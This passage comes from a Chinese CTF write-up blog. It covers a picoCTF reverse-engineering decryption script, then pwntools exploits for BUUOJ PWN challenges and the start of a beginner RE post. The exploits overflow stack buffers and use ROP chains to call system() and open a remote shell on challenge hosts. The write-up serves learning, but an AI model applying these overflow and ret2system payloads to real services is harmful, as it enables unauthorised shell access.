class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ptr[<span class="number">23</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF //保存flag</span></span><br><span class="line">    <span class="type">char</span> v5; <span class="comment">// [rsp+17h] [rbp-39h] //?</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-24h] //标志位</span></span><br><span class="line">    FILE *v7; <span class="comment">// [rsp+30h] [rbp-20h] //rev_this的文件指针</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+38h] [rbp-18h] //flag的文件指针</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">    <span class="type">char</span> v11; <span class="comment">// [rsp+4Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">    stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    v7 = fopen(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No flag found, please make sure this is run on the server&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please run this on the server&quot;</span>);</span><br><span class="line"></span><br><span class="line">    v6 = fread(ptr, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, stream); <span class="comment">//v6用于检查是否成功读取,flag长度为0x18==24</span></span><br><span class="line">                                            <span class="comment">//flag保存到ptr数组中</span></span><br><span class="line">                                            <span class="comment">//最后一位ptr[23]没有使用? &#x27;&#125;&#x27;?(一开始以为是&#x27;\0&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i ) &#123;<span class="comment">//读取前8个</span></span><br><span class="line">        v11 = ptr[i];</span><br><span class="line">        fputc(v11, v7);<span class="comment">//向v7(即rev_this文件)原封不动的写入前8位flag字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">8</span>; j &lt;= <span class="number">22</span>; ++j ) &#123; <span class="comment">//读取第9-23个flag字符</span></span><br><span class="line">        v11 = ptr[j];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//转换算法</span></span><br><span class="line">        <span class="keyword">if</span> ( (j &amp; <span class="number">1</span>) != <span class="number">0</span> ) <span class="comment">//如果j为奇数---j==8时是偶数</span></span><br><span class="line">            v11 -= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v11 += <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        fputc(v11, v7);<span class="comment">//处理后写入</span></span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v5;<span class="comment">//这里IDA分析的有点问题,问题不大</span></span><br><span class="line">    fputc(v5, v7);</span><br><span class="line">    fclose(v7);</span><br><span class="line">    <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写解密脚本(c/c++代码叫脚本?):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    FILE* rev_this = <span class="built_in">fopen</span>(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fread</span>(str, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, rev_this);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">8</span>;i&lt;<span class="number">23</span>;++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&amp;<span class="number">1</span>!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">putchar</span>(str[i]+<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">putchar</span>(str[i]<span class="number">-5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(str[<span class="number">23</span>]);<span class="comment">//单独处理一下那个v5(其实提交的时候加个&#125;就行,</span></span><br><span class="line">    <span class="comment">//但是这里因为不知道flag长啥样所以还是打印一下看看...万一是什么&#x27;\0&#x27;呢,doge)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801104929793.png" alt="image-20230801104929793"></p><p>结束…</p><h1 id="pwn">PWN</h1><h2 id="ciscn-2019-n-8">ciscn_2019_n_8</h2><p>先看看是啥文件—32位的,用IDA32打开</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802131013964.png" alt="image-20230802131013964" style="zoom:33%;" /><p>尝试IDA动态调试,莫名其妙不能动弹?难道是开了保护?(开保护是不能调试吗?)</p><p>额,nb…火力全开…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133400255.png" alt="image-20230802133400255" style="zoom:33%;" /><p>还是静态分析吧…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133651202.png" alt="image-20230802133651202" style="zoom: 50%;" /><p>这里其实最没弄明白的其实是那个LL,不确定val作为数组每个元素应该填充多长…但是这题是&lt;二进制&gt;赛项…</p><p>所以理论上这里应该是重点要关注的地方…</p><p>那么尽管IDA反编译出来的伪代码有点玄学…但是发现有一个重要的指针类型转换的步骤:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br></pre></td></tr></table></figure><p><code>QWORD</code>这个东西是4字节…众所周知,一个字是2字节,那么QWORD是4个字,也就是8字节…对上了,就是LL(long long)</p><p>那么就往进塞数据呗(这里我仍然想吐槽python的类型转换)</p><p>用python写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29245</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p64(<span class="number">17</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果(第二次的截图,省略了ls了…doge)<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802140330345.png" alt="image-20230802140330345"></p><p>结束…</p><h2 id="mrctf2020-easyoverflow">mrctf2020_easyoverflow</h2><p>这题就是个字符串溢出</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154650856.png" alt="image-20230802154650856" style="zoom: 50%;" /><p>首先main中v5被赋值为一个字符串,我叫他fake_flag0,然后有一个对v4的gets()</p><p>再看下面判断调用了check,并传递了v5这个字符数组</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154817689.png" alt="image-20230802154817689" style="zoom:50%;" /><p>参数和另一个字符串比较,去看看:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154845478.png" alt="image-20230802154845478" style="zoom:50%;" /><p>把这个字符串复制出来,我叫他fake_flag1</p><p>然后发现 main中v4有0x30个字节(48个)—(-0x40)-(-0x70)==0x30</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155008720.png" alt="image-20230802155008720" style="zoom:50%;" /><p>所以把这段内存覆盖了就行,exp如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155044396.png" alt="image-20230802155044396" style="zoom:50%;" /><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155058403.png" alt="image-20230802155058403" style="zoom:50%;" /><p>结束…</p><h2 id="jarvisoj-level2">jarvisoj_level2</h2><p>这道题最大的收获就是把x86的堆栈看了一遍,<s>还有脑内调试</s></p><p>有关X86 32位汇编利用堆栈传递函数参数的过程:</p><p>​<a href="https://blog.csdn.net/weixin_62320071/article/details/129475981">https://blog.csdn.net/weixin_62320071/article/details/129475981</a></p><p>​<a href="https://cloud.tencent.com/developer/article/2123636">https://cloud.tencent.com/developer/article/2123636</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&amp;utm_id=0">https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&amp;utm_id=0</a></p><p>​<img src="https://pic2.zhimg.com/80/v2-53b1f83688ed5cc4bc7c5efa791a315d_1440w.webp" alt="img" style="zoom:65%;" /></p><p>题解:</p><p>这道题是典型的栈溢出,IDA反编译后的代码非常简单,有system函数的地址,而且我们可以通过字符串查找找到存在/bin/bash这个字符串(可获取地址)</p><p>那么我们就直接让vulnerable_function返回的时候跳转到system函数去getshell就可以</p><p>具体是由于read可输入的长度大于缓冲区的长度,所以存在溢出,那么只需要合理构造payload即可进行getshell</p><p>(但是我做这题很吃力,x86汇编属实不会,主要是对函数栈帧掌握不清楚)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">hacker = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25439</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x88</span></span><br><span class="line">system_func_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_sh_str_addr = <span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#  首先先将该字符串数组填满，再输入一个地址，该地址将会作为新的栈底地址 ebp</span></span><br><span class="line"><span class="comment"># 再接着写入 函数调用返回的地址（即该值将来会pop 到 eip 中），即执行我们的system函数，为了把 字符串 /bin/sh 地址传入，我们还要往栈中随意插入一个将来的返回地址，再插入/bin/sh 地址</span></span><br><span class="line">payload = padding * <span class="string">b&#x27;a&#x27;</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802191847698.png" alt="image-20230802191847698"></p><p>勉强结束…</p><h2 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h2><h3 id="这道题学习到的知识点">这道题学习到的知识点</h3><p>参阅:</p><p>​<a href="https://zhuanlan.zhihu.com/p/502718676">https://zhuanlan.zhihu.com/p/502718676</a></p><p>​<a href="https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers">https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers</a></p><p>​<a href="https://www.cnblogs.com/nemuzuki/p/17218722.html">https://www.cnblogs.com/nemuzuki/p/17218722.html</a></p><p>​</p><h4 id="x86-64函数传参使用到的寄存器">x86_ 64函数传参使用到的寄存器</h4><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803114038935.png" alt="image-20230803114038935" style="zoom:50%;" /></p><p>​重点是rdi,rsi,rdx,rcx这几个</p><h3 id="分析题目">分析题目</h3><h4 id="1-参数问题">1.参数问题</h4><p>​这道题也是栈溢出,不过是x86_64的程序,所以我们重点注意的应该是去考虑x86_64和x86的堆栈(或者说函数调用时)有什么区别,而且重点要关注函数传参有什么不同</p><p>​经过学习,了解到在x86中,各个参数依次从右向左入栈(CDECL?),然后再压栈eip和ebp;</p><p>​而在x86_64中,如果子函数的参数数量&lt;=6个,那么就会使用到6个特殊的寄存器,也就是上面的rdi，rsi，rdx，rcx，r8，r9这6个寄存器.然后如果还有参数,则像32位一样压栈.</p><p>​那么也就是说,64位程序调用函数时,<strong>会先把参数从寄存器中pop出来,也就是pop rdi; ret指令</strong></p><p>​对应到本题中调用system()函数只需要传递一个字符串,也就是system执行的命令,所以只需要多考虑一个rdi(第一个入参对应的寄存器)的问题</p><h4 id="2-题目分析">2.题目分析</h4><p>​分析好关键后,接下来开始审题</p><p>​这次做题思路比较清晰,而且看了看雪上的某篇IDA使用教程,这回在IDAview视图中认真分析了一下汇编,后面记录一下(虽然和这道题的题解关系不大,但是有助于理解x86_64函数传参)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115419472.png" alt="image-20230803115419472" style="zoom:50%;" /></p><p>​题目和x86版本的基本一致,仍然是标准的栈溢出:buf数组长度为0x80,然而read()可以输入0x200,满足溢出</p><p>​同样,去找system()的地址和/bin/bash的地址</p><p>​shift+F12打开字符串,可以看到存在/bin/bash—0x600A90</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115829908.png" alt="image-20230803115829908" style="zoom:50%;" /></p><p>​发现有_system函数(注意不是extern的那个system)—0x4004C0</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115952419.png" alt="image-20230803115952419" style="zoom: 40%;" /></p><p>​接下来就是区别,需要找到pop rdi; ret指令的地址,以便调用</p><p>​这里需要使用到Linux下的ROPgadget工具查找(第一次用这个,看了一下使用方法)</p><p>​找到地址为0x4006b3<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803121412077.png" alt="image-20230803121412077"></p><h4 id="3-payload">3.payload</h4><p>​覆盖模板: [函数局部变量(buf数组)]+[rbp]+[pop rdi; ret指令的地址]+[’/bin/bash’的地址]+[system()函数的地址(实际上是那个_system())]</p><p>​python代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27828</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4004C0</span></span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span>) + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x8</span>) + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122534132.png" alt="image-20230803122534132" style="zoom:45%;" /><p>​题解到此结束…</p><h3 id="题目idaview分析记录">题目IDAview分析记录</h3><h4 id="main-汇编分析">main()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122808494.png" alt="image-20230803122808494"></p><p>main中有两个变量var_10和var_4</p><p>首先是调用main时,开头的push rbp;mov rbp,rsp指令创建函数栈帧,然后sub rsp,10h给局部变量(形参?)分配空间(10h应该是16字节给两个变量,一个int argc和一个char *argv[]的数组—数组形参实际上是一个指针,所以也是8字节)</p><p>然后接下来的两个mov就能看出来x86_64的传参了,第一个是edi,第二个是rsi,逐个从寄存器中复制到内存</p><p>然后eax置0</p><p>此时该调用函数了,因为vulnerable_function没有形参,所以没有对edi这些寄存器进行处理,直接调用</p><h4 id="vulnerable-function-汇编分析">vulnerable_function()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803123501210.png" alt="image-20230803123501210"></p><p>同样在开头push rbp;mov rbp,rsp创建函数栈帧</p><p>接下来是对rsp进行add,但是这里我不理解为什么是add而不是sub(),总之就是对buf数组进行处理分配</p><p>下一行就是为_system函数的调用做准备,处理实参:</p><p>​mov     edi, offset command ; &quot;echo Input:&quot;中,offset表示获取一个标号,command标号代表的内存中存有这个字符串,将其赋值给edi用于_system的第一个参数(只有这一个参数)</p><p>然后调用_system()</p><p>返回来后,继续为_read()的调用做准备:</p><p>​先放上来_read()的描述(注意参数的位置):</p><p>​<strong>其实这个函数就是unistd.h(UNIX std)中声明的read()函数,用于文件读写</strong></p><p>​第一个参数是文件描述符(0代表标准输入stdin,1代表标准输出stdout,2表示标准错误输出stderr)</p><p>​第二个参数是输入的目标缓冲区</p><p>​第三个参数是指定要读取的最大字节数</p><p>​<code>ssize_t read(int fd, void *buf, size_t nbytes)</code></p><p>​lea指令全称是 “Load Effective Address”，意为加载有效地址,就是将指定的内存地址计算出来并存放在目标寄存器中.这里这条指令将 <code>rbp+buf</code> 地址的计算结果保存在 <code>rax</code> 中,准备赋值给rsi</p><p>​将200h赋值给edx作为第3个参数(nbytes)</p><p>​将刚刚计算出来的eax赋值给rsi作为第二个参数(buf)</p><p>​将0h赋值给edi作为第一个参数(fd)</p><p>然后调用_read(),这道题的切入点就是这里</p><p>后面的部分没看…留作以后…</p><p>结束…</p><h2 id="ciscn-2019-ne-5">ciscn_2019_ne_5</h2><p>这道题就是绕了一下,利用strcat()进行了栈溢出,同时不同的步骤需要从不同的函数进行处理利用,要进行顺序分析</p><p>分析如下:</p><p>代码首先需要输入正确的密码,然后下面是一个switch的循环(注意反编译显示循环使用一个跳转函数实现)</p><p>Addlog中允许输入0x80(128)长度的src</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200612721.png" alt="image-20230805200612721" style="zoom:50%;" /></p><p>print中有_system()函数可以利用</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200628207.png" alt="image-20230805200628207" style="zoom:45%;" /></p><p>getflag中有strcpy,同时局部变量(反编译问题)共有0x48,0x80&gt;0x48,满足溢出</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200700665.png" alt="image-20230805200700665" style="zoom:50%;" /></p><p>ROPgadget工具查找’sh’字符串的地址(此题没有/bin/sh)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200722034.png" alt="image-20230805200722034" style="zoom: 40%;" /></p><p>先走1选项,输入足够长的字符串准备溢出,然后走4选项进行strcpy溢出,跳转至system()即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27895</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x080484D0</span></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x48</span> + <span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;info:&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200041706.png" alt="image-20230805200041706" style="zoom:33%;" /><p>这题看了半天需要填充多少字节,唉,看错了</p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> x64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第一周</title>
      <link href="/2023-07-27-d96bc12e05b6/"/>
      <url>/2023-07-27-d96bc12e05b6/</url>
      
        <content type="html"><![CDATA[<p>以前除了新生赛再没写过WP,还是多写这东西好(博客搭建还没搞好QWQ)</p><h1 id="re">RE:</h1><p>所有题来自picoCTF2022,题目很简单,适用于萌新蒟蒻(比如我)入门快速适应re和pwn等题目的模式和解题一般顺序</p><h2 id="file-run1">file-run1:</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-111.png" alt="img"></p><p>是的,我们需要一个命令行(显然可以知道是个bash…),丢进去跑就行了…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-112.png" alt="img"></p><p>菜鸟’s writeup结束…</p><p>或者有椰叶丢进IDA里瞧瞧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-113.png" alt="img"></p><p>去找flag吧…(好像是ctrl+鼠标左键?..)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-114.png" alt="img"></p><p>结束了…</p><h2 id="file-run2">file-run2:</h2><p>丢个Hello!的参数跑就完事了(我太菜了)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-115.png" alt="img"></p><p>中间还打错个字母…</p><h2 id="gdb-test-drive">GDB Test Drive:</h2><p>emm…这玩意就是看看你gdb装没装…虽然但是,我还得学学gdb(毕竟CLion/VS的可视化用惯了…)</p><p>(此处gdbme默认有x权限,所以没用chmod)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-116.png" alt="img"></p><p>一条一条运行调试的子命令就行(回头再学吧…gdb不是太会用)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-117.png" alt="img"></p><p>结束…</p><h2 id="patchme-py"><a href="http://patchme.py">patchme.py</a>:</h2><p>咱就是问,还有什么比源码更香的东西吗?..直接分析源码…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-118.png" alt="img"></p><p>python这东西就在windows下跑吧,毕竟库都装在windows下(虽然不知道为啥控制台识别不到库…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-119.png" alt="img"></p><p>直接看源码,发现就是个字符串比较(暂时不想管那个加密的事…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-120.png" alt="img"></p><p>有一说一,我才懒得构造那个密码,我直接全删了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-121.png" alt="img"></p><p>保存了再跑就完事了…(源码在手还怕啥)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-122.png" alt="img"></p><p>至于解密方法能看懂在干啥,但是密码基础一点没有,反正先能跑出来再说,坐等椰叶们讲解(doge)</p><h2 id="safe-opener">Safe Opener:</h2><p>.java也是源码…</p><p>SublimeText4 yyds!!!我直接看源码(nnd我不会java怎么办…好在c++基础还可以…)</p><p>吐槽:java获取个输入这么费劲?还得手动创建输入流对象?</p><p>相信椰叶们都能看懂代码…密钥就是这一坨:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-123.png" alt="img"></p><p>而且一看就知道是base64</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-124.png" alt="img"></p><p>《最好用的Base64在线工具》…怕不是不知道CyberChef的大名…</p><p>结束…</p><h2 id="unpackme-py"><a href="http://unpackme.py">unpackme.py</a>:</h2><p>经典的加密解密库(但是我不会)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-125.png" alt="img"></p><p>第12行发现要对解码后的东西进行运行…所以知道加密的是一段代码,所以把exec换成print逝逝:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-126.png" alt="img"></p><p>这里有点奇葩,命令行找不到我的库…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-127.png" alt="img"></p><p>还是打开pycharm吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-128.png" alt="img"></p><p>好吧直接结束…</p><h2 id="bloat-py"><a href="http://bloat.py">bloat.py</a>:</h2><p>这个程序的函数名和变量名一看就是故意的…加点注释一点点分析看看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-129.png" alt="img"></p><p>可以看到函数arg133()中有一个比较,并且对比成功了会有一个输出,我们直接将那个字符串单独打印看看(先把其他代码注释掉):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-130.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-131.png" alt="img"></p><p>也就是说我们输入的arg432变量的值就是这个,所以将代码恢复原样重新以这个输入值运行一遍:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-132.png" alt="img"></p><p>解密成功!</p><p>注: .enc文件为常见的加密后的文件格式,常常出现在勒索病毒运行后的结果,或对文件进行加密的情况,这里的代码即对其进行特定方式的解密</p><h2 id="fresh-java">Fresh Java:</h2><p>这道题也不难,逆向一下class文件,然后写个解密脚本就行</p><h3 id="第一步-java逆向">第一步-java逆向:</h3><p>某椰叶提供的在线逆向网站:<a href="http://javare.cn">http://javare.cn</a>(注意文本是白色的…我以为出问题了)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-133.png" alt="img"></p><p>复制到一个java文件,观察发现(虽然我不会java,但是好在会其他语言…)对比的是一个字符串的每一个字符(ASCII码)</p><p>于是,我们可以使用正则表达式…把那一堆ASCII码提取出来(这里在sublimetext4里使用查找替换的正则模式):</p><h3 id="第二步-正则部分">第二步-正则部分:</h3><h4 id="第一步">第一步:</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-134.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-135.png" alt="img"></p><h4 id="第二步">第二步:</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-136.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-137.png" alt="img"></p><p>直接复制出来</p><h3 id="第三步-解密脚本">第三步-解密脚本:</h3><p><img 